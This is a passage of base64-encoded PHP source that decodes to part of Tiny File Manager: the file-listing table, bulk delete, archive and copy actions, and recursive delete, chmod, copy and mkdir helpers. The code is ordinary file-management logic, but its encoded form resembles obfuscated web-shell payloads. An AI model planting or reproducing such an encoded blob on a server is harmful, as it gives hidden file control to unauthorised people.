gICAgICAgIDxkaXYgY2xhc3M9ImN1c3RvbS1jb250cm9sIGN1c3RvbS1jaGVja2JveCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCIgaWQ9Ijw/cGhwIGVjaG8gJGlrID8+IiBuYW1lPSJmaWxlW10iIHZhbHVlPSI8P3BocCBlY2hvIGZtX2VuYygkZikgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGNsYXNzPSJjdXN0b20tY29udHJvbC1sYWJlbCIgZm9yPSI8P3BocCBlY2hvICRpayA/PiI+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvdGQ+PD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICAgICAgPHRkPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJmaWxlbmFtZSI+IAogICAgICAgICAgICAgICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5fYXJyYXkoc3RydG9sb3dlcihwYXRoaW5mbygkZiwgUEFUSElORk9fRVhURU5TSU9OKSksIGFycmF5KCdnaWYnLCAnanBnJywgJ2pwZWcnLCAncG5nJywgJ2JtcCcsICdpY28nLCAnc3ZnJykpKTogPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCAkaW1hZ2VQcmV2aWV3ID0gZm1fZW5jKEZNX1JPT1RfVVJMIC4gKEZNX1BBVEggIT0gJycgPyAnLycgLiBGTV9QQVRIIDogJycpIC4gJy8nIC4gJGYpOyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ijw/cGhwIGVjaG8gJGZpbGVsaW5rID8+IiBkYXRhLXByZXZpZXctaW1hZ2U9Ijw/cGhwIGVjaG8gJGltYWdlUHJldmlldyA/PiIgdGl0bGU9Ijw/cGhwIGVjaG8gJGYgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbHNlOiA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGhyZWY9Ijw/cGhwIGVjaG8gJGZpbGVsaW5rID8+IiB0aXRsZT0iPD9waHAgZWNobyAkZiA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGkgY2xhc3M9Ijw/cGhwIGVjaG8gJGltZyA/PiI+PC9pPiA8P3BocCBlY2hvIGZtX2NvbnZlcnRfd2luKCRmKSA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvKCRpc19saW5rID8gJyAmcmFycjsgPGk+JyAuIHJlYWRsaW5rKCRwYXRoIC4gJy8nIC4gJGYpIC4gJzwvaT4nIDogJycpID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIGRhdGEtc29ydD1iLSI8P3BocCBlY2hvIHN0cl9wYWQoJGZpbGVzaXplX3JhdywgMTgsICIwIiwgU1RSX1BBRF9MRUZUKTsgPz4iPjxzcGFuIHRpdGxlPSI8P3BocCBwcmludGYoJyVzIGJ5dGVzJywgJGZpbGVzaXplX3JhdykgPz4iPgogICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvICRmaWxlc2l6ZTsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPC9zcGFuPjwvdGQ+CiAgICAgICAgICAgICAgICAgICAgPHRkIGRhdGEtc29ydD0iYi08P3BocCBlY2hvICRtb2RpZl9yYXc7Pz4iPjw/cGhwIGVjaG8gJG1vZGlmID8+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8P3BocCBpZiAoIUZNX0lTX1dJTiAmJiAhJGhpZGVfQ29scyk6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDx0ZD48P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz48YSB0aXRsZT0iPD9waHAgZWNobyAnQ2hhbmdlIFBlcm1pc3Npb25zJyA/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NobW9kPTw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiI+PD9waHAgZWNobyAkcGVybXMgPz48L2E+PD9waHAgZWxzZTogPz48P3BocCBlY2hvICRwZXJtcyA/Pjw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PD9waHAgZWNobyBmbV9lbmMoJG93bmVyWyduYW1lJ10gLiAnOicgLiAkZ3JvdXBbJ25hbWUnXSkgPz48L3RkPgogICAgICAgICAgICAgICAgICAgIDw/cGhwIGVuZGlmOyA/PgogICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iaW5saW5lLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1ByZXZpZXcnKSA/PiIgaHJlZj0iPD9waHAgZWNobyAkZmlsZWxpbmsuJyZxdWlja1ZpZXc9MSc7ID8+IiBkYXRhLXRvZ2dsZT0ibGlnaHRib3giIGRhdGEtZ2FsbGVyeT0idGlueS1nYWxsZXJ5IiBkYXRhLXRpdGxlPSI8P3BocCBlY2hvIGZtX2NvbnZlcnRfd2luKCRmKSA/PiIgZGF0YS1tYXgtd2lkdGg9IjEwMCUiIGRhdGEtd2lkdGg9IjEwMCUiPjxpIGNsYXNzPSJmYSBmYS1leWUiPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDw/cGhwIGlmICghRk1fUkVBRE9OTFkpOiA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGEgdGl0bGU9Ijw/cGhwIGVjaG8gbG5nKCdEZWxldGUnKSA/PiIgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2RlbD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iIG9uY2xpY2s9InJldHVybiBjb25maXJtKCc8P3BocCBlY2hvIGxuZygnRGVsZXRlJykuJyAnLmxuZygnRmlsZScpLic/JzsgPz5cbiBcbiAoIDw/cGhwIGVjaG8gdXJsZW5jb2RlKCRmKSA/PiApJyk7Ij4gPGkgY2xhc3M9ImZhIGZhLXRyYXNoLW8iPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ1JlbmFtZScpID8+IiBocmVmPSIjIiBvbmNsaWNrPSJyZW5hbWUoJzw/cGhwIGVjaG8gZm1fZW5jKEZNX1BBVEgpID8+JywgJzw/cGhwIGVjaG8gZm1fZW5jKGFkZHNsYXNoZXMoJGYpKSA/PicpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1wZW5jaWwtc3F1YXJlLW8iPjwvaT48L2E+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0NvcHlUbycpID8+Li4uIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaHJlZj0iP3A9PD9waHAgZWNobyB1cmxlbmNvZGUoRk1fUEFUSCkgPz4mYW1wO2NvcHk9PD9waHAgZWNobyB1cmxlbmNvZGUodHJpbShGTV9QQVRIIC4gJy8nIC4gJGYsICcvJykpID8+Ij48aSBjbGFzcz0iZmEgZmEtZmlsZXMtbyI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZW5kaWY7ID8+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIHRpdGxlPSI8P3BocCBlY2hvIGxuZygnRGlyZWN0TGluaycpID8+IiBocmVmPSI8P3BocCBlY2hvIGZtX2VuYyhGTV9ST09UX1VSTCAuIChGTV9QQVRIICE9ICcnID8gJy8nIC4gRk1fUEFUSCA6ICcnKSAuICcvJyAuICRmKSA/PiIgdGFyZ2V0PSJfYmxhbmsiPjxpIGNsYXNzPSJmYSBmYS1saW5rIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSB0aXRsZT0iPD9waHAgZWNobyBsbmcoJ0Rvd25sb2FkJykgPz4iIGhyZWY9Ij9wPTw/cGhwIGVjaG8gdXJsZW5jb2RlKEZNX1BBVEgpID8+JmFtcDtkbD08P3BocCBlY2hvIHVybGVuY29kZSgkZikgPz4iPjxpIGNsYXNzPSJmYSBmYS1kb3dubG9hZCI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICA8L3RkPgogICAgICAgICAgICAgICAgPC90cj4KICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgICAgICBmbHVzaCgpOwogICAgICAgICAgICAgICAgJGlrKys7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChlbXB0eSgkZm9sZGVycykgJiYgZW1wdHkoJGZpbGVzKSkgewogICAgICAgICAgICAgICAgPz4KICAgICAgICAgICAgICAgIDx0Zm9vdD4KICAgICAgICAgICAgICAgICAgICA8dHI+PD9waHAgaWYgKCFGTV9SRUFET05MWSk6ID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQ+PC90ZD48P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49Ijw/cGhwIGVjaG8gKCFGTV9JU19XSU4gJiYgISRoaWRlX0NvbHMpID8gJzYnIDogJzQnID8+Ij48ZW0+PD9waHAgZWNobyAnRm9sZGVyIGlzIGVtcHR5JyA/PjwvZW0+PC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90Zm9vdD4KICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICA/PgogICAgICAgICAgICAgICAgPHRmb290PgogICAgICAgICAgICAgICAgICAgIDx0cj48P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDx0ZCBjbGFzcz0iZ3JheSI+PC90ZD48P3BocCBlbmRpZjsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJncmF5IiBjb2xzcGFuPSI8P3BocCBlY2hvICghRk1fSVNfV0lOICYmICEkaGlkZV9Db2xzKSA/ICc2JyA6ICc0JyA/PiI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnRnVsbFNpemUnKS4nOiA8c3BhbiBjbGFzcz0iYmFkZ2UgYmFkZ2UtbGlnaHQiPicuZm1fZ2V0X2ZpbGVzaXplKCRhbGxfZmlsZXNfc2l6ZSkuJzwvc3Bhbj4nID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnRmlsZScpLic6IDxzcGFuIGNsYXNzPSJiYWRnZSBiYWRnZS1saWdodCI+Jy4kbnVtX2ZpbGVzLic8L3NwYW4+JyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ0ZvbGRlcicpLic6IDxzcGFuIGNsYXNzPSJiYWRnZSBiYWRnZS1saWdodCI+Jy4kbnVtX2ZvbGRlcnMuJzwvc3Bhbj4nID8+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8P3BocCBlY2hvIGxuZygnTWVtb3J5VXNlZCcpLic6IDxzcGFuIGNsYXNzPSJiYWRnZSBiYWRnZS1saWdodCI+Jy5mbV9nZXRfZmlsZXNpemUoQG1lbW9yeV9nZXRfdXNhZ2UodHJ1ZSkpLic8L3NwYW4+JyA/PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPD9waHAgZWNobyBsbmcoJ1BhcnRpdGlvblNpemUnKS4nOiA8c3BhbiBjbGFzcz0iYmFkZ2UgYmFkZ2UtbGlnaHQiPicuZm1fZ2V0X2ZpbGVzaXplKEBkaXNrX2ZyZWVfc3BhY2UoJHBhdGgpKSAuJzwvc3Bhbj4gJy5sbmcoJ0ZyZWVPZicpLicgPHNwYW4gY2xhc3M9ImJhZGdlIGJhZGdlLWxpZ2h0Ij4nLmZtX2dldF9maWxlc2l6ZShAZGlza190b3RhbF9zcGFjZSgkcGF0aCkpLic8L3NwYW4+JzsgPz4KICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4KICAgICAgICAgICAgICAgICAgICA8L3RyPgogICAgICAgICAgICAgICAgPC90Zm9vdD4KICAgICAgICAgICAgICAgIDw/cGhwCiAgICAgICAgICAgIH0KICAgICAgICAgICAgPz4KICAgICAgICA8L3RhYmxlPgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8P3BocCBpZiAoIUZNX1JFQURPTkxZKTogPz4KICAgICAgICA8ZGl2IGNsYXNzPSJjb2wteHMtMTIgY29sLXNtLTkiPgogICAgICAgICAgICA8dWwgY2xhc3M9Imxpc3QtaW5saW5lIGZvb3Rlci1hY3Rpb24iPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj4gPGEgaHJlZj0iIy9zZWxlY3QtYWxsIiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIiBvbmNsaWNrPSJzZWxlY3RfYWxsKCk7cmV0dXJuIGZhbHNlOyI+PGkgY2xhc3M9ImZhIGZhLWNoZWNrLXNxdWFyZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnU2VsZWN0QWxsJykgPz4gPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxhIGhyZWY9IiMvdW5zZWxlY3QtYWxsIiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIiBvbmNsaWNrPSJ1bnNlbGVjdF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtd2luZG93LWNsb3NlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdVblNlbGVjdEFsbCcpID8+IDwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48YSBocmVmPSIjL2ludmVydC1hbGwiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiIG9uY2xpY2s9ImludmVydF9hbGwoKTtyZXR1cm4gZmFsc2U7Ij48aSBjbGFzcz0iZmEgZmEtdGgtbGlzdCI+PC9pPiA8P3BocCBlY2hvIGxuZygnSW52ZXJ0U2VsZWN0aW9uJykgPz4gPC9hPjwvbGk+CiAgICAgICAgICAgICAgICA8bGkgY2xhc3M9Imxpc3QtaW5saW5lLWl0ZW0iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJoaWRkZW4iIG5hbWU9ImRlbGV0ZSIgaWQ9ImEtZGVsZXRlIiB2YWx1ZT0iRGVsZXRlIiBvbmNsaWNrPSJyZXR1cm4gY29uZmlybSgnRGVsZXRlIHNlbGVjdGVkIGZpbGVzIGFuZCBmb2xkZXJzPycpIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLWRlbGV0ZScpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtdHJhc2giPjwvaT4gPD9waHAgZWNobyBsbmcoJ0RlbGV0ZScpID8+IDwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaGlkZGVuIiBuYW1lPSJ6aXAiIGlkPSJhLXppcCIgdmFsdWU9InppcCIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJ0NyZWF0ZSBhcmNoaXZlPycpIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXppcCcpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1ppcCcpID8+IDwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaGlkZGVuIiBuYW1lPSJ0YXIiIGlkPSJhLXRhciIgdmFsdWU9InRhciIgb25jbGljaz0icmV0dXJuIGNvbmZpcm0oJ0NyZWF0ZSBhcmNoaXZlPycpIj4KICAgICAgICAgICAgICAgICAgICA8YSBocmVmPSJqYXZhc2NyaXB0OmRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdhLXRhcicpLmNsaWNrKCk7IiBjbGFzcz0iYnRuIGJ0bi1zbWFsbCBidG4tb3V0bGluZS1wcmltYXJ5IGJ0bi0yIj48aSBjbGFzcz0iZmEgZmEtZmlsZS1hcmNoaXZlLW8iPjwvaT4gPD9waHAgZWNobyBsbmcoJ1RhcicpID8+IDwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJsaXN0LWlubGluZS1pdGVtIj48aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iaGlkZGVuIiBuYW1lPSJjb3B5IiBpZD0iYS1jb3B5IiB2YWx1ZT0iQ29weSI+CiAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iamF2YXNjcmlwdDpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYS1jb3B5JykuY2xpY2soKTsiIGNsYXNzPSJidG4gYnRuLXNtYWxsIGJ0bi1vdXRsaW5lLXByaW1hcnkgYnRuLTIiPjxpIGNsYXNzPSJmYSBmYS1maWxlcy1vIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDb3B5JykgPz4gPC9hPjwvbGk+CiAgICAgICAgICAgIDwvdWw+CiAgICAgICAgPC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLTMgZC1ub25lIGQtc20tYmxvY2siPjxhIGhyZWY9Imh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pbyIgdGFyZ2V0PSJfYmxhbmsiIGNsYXNzPSJmbG9hdC1yaWdodCB0ZXh0LW11dGVkIj5UaW55IEZpbGUgTWFuYWdlciA8P3BocCBlY2hvIFZFUlNJT047ID8+PC9hPjwvZGl2PgogICAgICAgIDw/cGhwIGVsc2U6ID8+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC0xMiI+PGEgaHJlZj0iaHR0cHM6Ly90aW55ZmlsZW1hbmFnZXIuZ2l0aHViLmlvIiB0YXJnZXQ9Il9ibGFuayIgY2xhc3M9ImZsb2F0LXJpZ2h0IHRleHQtbXV0ZWQiPlRpbnkgRmlsZSBNYW5hZ2VyIDw/cGhwIGVjaG8gVkVSU0lPTjsgPz48L2E+PC9kaXY+CiAgICAgICAgPD9waHAgZW5kaWY7ID8+CiAgICA8L2Rpdj4KCjwvZm9ybT4KCjw/cGhwCmZtX3Nob3dfZm9vdGVyKCk7CgovLy0tLSBFTkQKCi8vIEZ1bmN0aW9ucwoKLyoqCiAqIENoZWNrIGlmIHRoZSBmaWxlbmFtZSBpcyBhbGxvd2VkLgogKiBAcGFyYW0gc3RyaW5nICRmaWxlbmFtZQogKiBAcmV0dXJuIGJvb2wKICovCmZ1bmN0aW9uIGZtX2lzX2ZpbGVfYWxsb3dlZCgkZmlsZW5hbWUpCnsKICAgIC8vIEJ5IGRlZmF1bHQsIG5vIGZpbGUgaXMgYWxsb3dlZAogICAgJGFsbG93ZWQgPSBmYWxzZTsKCiAgICBpZiAoRk1fRVhURU5TSU9OKSB7CiAgICAgICAgJGV4dCA9IHN0cnRvbG93ZXIocGF0aGluZm8oJGZpbGVuYW1lLCBQQVRISU5GT19FWFRFTlNJT04pKTsKCiAgICAgICAgaWYgKGluX2FycmF5KCRleHQsIGV4cGxvZGUoJywnLCBzdHJ0b2xvd2VyKEZNX0VYVEVOU0lPTikpKSkgewogICAgICAgICAgICAkYWxsb3dlZCA9IHRydWU7CiAgICAgICAgfQogICAgfQoKICAgIHJldHVybiAkYWxsb3dlZDsKfQoKLyoqCiAqIERlbGV0ZSAgZmlsZSBvciBmb2xkZXIgKHJlY3Vyc2l2ZWx5KQogKiBAcGFyYW0gc3RyaW5nICRwYXRoCiAqIEByZXR1cm4gYm9vbAogKi8KZnVuY3Rpb24gZm1fcmRlbGV0ZSgkcGF0aCkKewogICAgaWYgKGlzX2xpbmsoJHBhdGgpKSB7CiAgICAgICAgcmV0dXJuIHVubGluaygkcGF0aCk7CiAgICB9IGVsc2VpZiAoaXNfZGlyKCRwYXRoKSkgewogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7CiAgICAgICAgJG9rID0gdHJ1ZTsKICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoIWZtX3JkZWxldGUoJHBhdGggLiAnLycgLiAkZmlsZSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG9rID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiAoJG9rKSA/IHJtZGlyKCRwYXRoKSA6IGZhbHNlOwogICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7CiAgICAgICAgcmV0dXJuIHVubGluaygkcGF0aCk7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCi8qKgogKiBSZWN1cnNpdmUgY2htb2QKICogQHBhcmFtIHN0cmluZyAkcGF0aAogKiBAcGFyYW0gaW50ICRmaWxlbW9kZQogKiBAcGFyYW0gaW50ICRkaXJtb2RlCiAqIEByZXR1cm4gYm9vbAogKiBAdG9kbyBXaWxsIHVzZSBpbiBtYXNzIGNobW9kCiAqLwpmdW5jdGlvbiBmbV9yY2htb2QoJHBhdGgsICRmaWxlbW9kZSwgJGRpcm1vZGUpCnsKICAgIGlmIChpc19kaXIoJHBhdGgpKSB7CiAgICAgICAgaWYgKCFjaG1vZCgkcGF0aCwgJGRpcm1vZGUpKSB7CiAgICAgICAgICAgIHJldHVybiBmYWxzZTsKICAgICAgICB9CiAgICAgICAgJG9iamVjdHMgPSBzY2FuZGlyKCRwYXRoKTsKICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoIWZtX3JjaG1vZCgkcGF0aCAuICcvJyAuICRmaWxlLCAkZmlsZW1vZGUsICRkaXJtb2RlKSkgewogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIHJldHVybiB0cnVlOwogICAgfSBlbHNlaWYgKGlzX2xpbmsoJHBhdGgpKSB7CiAgICAgICAgcmV0dXJuIHRydWU7CiAgICB9IGVsc2VpZiAoaXNfZmlsZSgkcGF0aCkpIHsKICAgICAgICByZXR1cm4gY2htb2QoJHBhdGgsICRmaWxlbW9kZSk7CiAgICB9CiAgICByZXR1cm4gZmFsc2U7Cn0KCi8qKgogKiBDaGVjayB0aGUgZmlsZSBleHRlbnNpb24gd2hpY2ggaXMgYWxsb3dlZCBvciBub3QKICogQHBhcmFtIHN0cmluZyAkZmlsZW5hbWUKICogQHJldHVybiBib29sCiAqLwpmdW5jdGlvbiBmbV9pc192YWxpZF9leHQoJGZpbGVuYW1lKQp7CiAgICAkYWxsb3dlZCA9IChGTV9GSUxFX0VYVEVOU0lPTikgPyBleHBsb2RlKCcsJywgRk1fRklMRV9FWFRFTlNJT04pIDogZmFsc2U7CgogICAgJGV4dCA9IHBhdGhpbmZvKCRmaWxlbmFtZSwgUEFUSElORk9fRVhURU5TSU9OKTsKICAgICRpc0ZpbGVBbGxvd2VkID0gKCRhbGxvd2VkKSA/IGluX2FycmF5KCRleHQsICRhbGxvd2VkKSA6IHRydWU7CgogICAgcmV0dXJuICgkaXNGaWxlQWxsb3dlZCkgPyB0cnVlIDogZmFsc2U7Cn0KCi8qKgogKiBTYWZlbHkgcmVuYW1lCiAqIEBwYXJhbSBzdHJpbmcgJG9sZAogKiBAcGFyYW0gc3RyaW5nICRuZXcKICogQHJldHVybiBib29sfG51bGwKICovCmZ1bmN0aW9uIGZtX3JlbmFtZSgkb2xkLCAkbmV3KQp7CiAgICAkaXNGaWxlQWxsb3dlZCA9IGZtX2lzX3ZhbGlkX2V4dCgkbmV3KTsKCiAgICBpZighJGlzRmlsZUFsbG93ZWQpIHJldHVybiBmYWxzZTsKCiAgICByZXR1cm4gKCFmaWxlX2V4aXN0cygkbmV3KSAmJiBmaWxlX2V4aXN0cygkb2xkKSkgPyByZW5hbWUoJG9sZCwgJG5ldykgOiBudWxsOwp9CgovKioKICogQ29weSBmaWxlIG9yIGZvbGRlciAocmVjdXJzaXZlbHkpLgogKiBAcGFyYW0gc3RyaW5nICRwYXRoCiAqIEBwYXJhbSBzdHJpbmcgJGRlc3QKICogQHBhcmFtIGJvb2wgJHVwZCBVcGRhdGUgZmlsZXMKICogQHBhcmFtIGJvb2wgJGZvcmNlIENyZWF0ZSBmb2xkZXIgd2l0aCBzYW1lIG5hbWVzIGluc3RlYWQgZmlsZQogKiBAcmV0dXJuIGJvb2wKICovCmZ1bmN0aW9uIGZtX3Jjb3B5KCRwYXRoLCAkZGVzdCwgJHVwZCA9IHRydWUsICRmb3JjZSA9IHRydWUpCnsKICAgIGlmIChpc19kaXIoJHBhdGgpKSB7CiAgICAgICAgaWYgKCFmbV9ta2RpcigkZGVzdCwgJGZvcmNlKSkgewogICAgICAgICAgICByZXR1cm4gZmFsc2U7CiAgICAgICAgfQogICAgICAgICRvYmplY3RzID0gc2NhbmRpcigkcGF0aCk7CiAgICAgICAgJG9rID0gdHJ1ZTsKICAgICAgICBpZiAoaXNfYXJyYXkoJG9iamVjdHMpKSB7CiAgICAgICAgICAgIGZvcmVhY2ggKCRvYmplY3RzIGFzICRmaWxlKSB7CiAgICAgICAgICAgICAgICBpZiAoJGZpbGUgIT0gJy4nICYmICRmaWxlICE9ICcuLicpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoIWZtX3Jjb3B5KCRwYXRoIC4gJy8nIC4gJGZpbGUsICRkZXN0IC4gJy8nIC4gJGZpbGUpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRvayA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICByZXR1cm4gJG9rOwogICAgfSBlbHNlaWYgKGlzX2ZpbGUoJHBhdGgpKSB7CiAgICAgICAgcmV0dXJuIGZtX2NvcHkoJHBhdGgsICRkZXN0LCAkdXBkKTsKICAgIH0KICAgIHJldHVybiBmYWxzZTsKfQoKLyoqCiAqIFNhZmVseSBjcmVhdGUgZm9sZGVyCiAqIEBwYXJhbSBzdHJpbmcgJGRpcgogKiBAcGFyYW0gYm9vbCAkZm9yY2UKICogQHJldHVybiBib29sCiAqLwpmdW5jdGlvbiBmbV9ta2RpcigkZGlyLCAkZm9yY2UpCnsKICAgIGlmIChmaWxlX2V4aXN0cygkZGlyKSkgewogICAgICAgIGlmIChpc19kaXIoJGRpcikpIHsKICAgICAgICAgICAgcmV0dXJuICRkaXI7CiAgICAgICAgfSBlbHNlaWYgKCEkZm9yY2UpIHsKICAgICAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgICAgIH0KICAgICAgICB1bmxpbmsoJGRpcik7CiAgICB9CiAgICByZXR1cm4gbWtkaXIoJGRpciwgMDc3NywgdHJ1ZSk7Cn0KCi8qKgogKiBTYWZlbHkgY29weSBmaWxlCiAqIEBwYXJhbSBzdHJpbmcgJGYxCiAqIEBwYXJhbSBzdHJpbmcgJGYyCiAqIEBwYXJhbSBib29sICR1cGQgSW5kaWNhdGVzIGlmIGZpbGUgc2hvdWxkIGJlIHVwZGF0ZWQgd2l0aCBuZXcgY29udGVudAogKiBAcmV0dXJuIGJvb2wKICovCmZ1bmN0aW9uIGZtX2NvcHkoJGYxL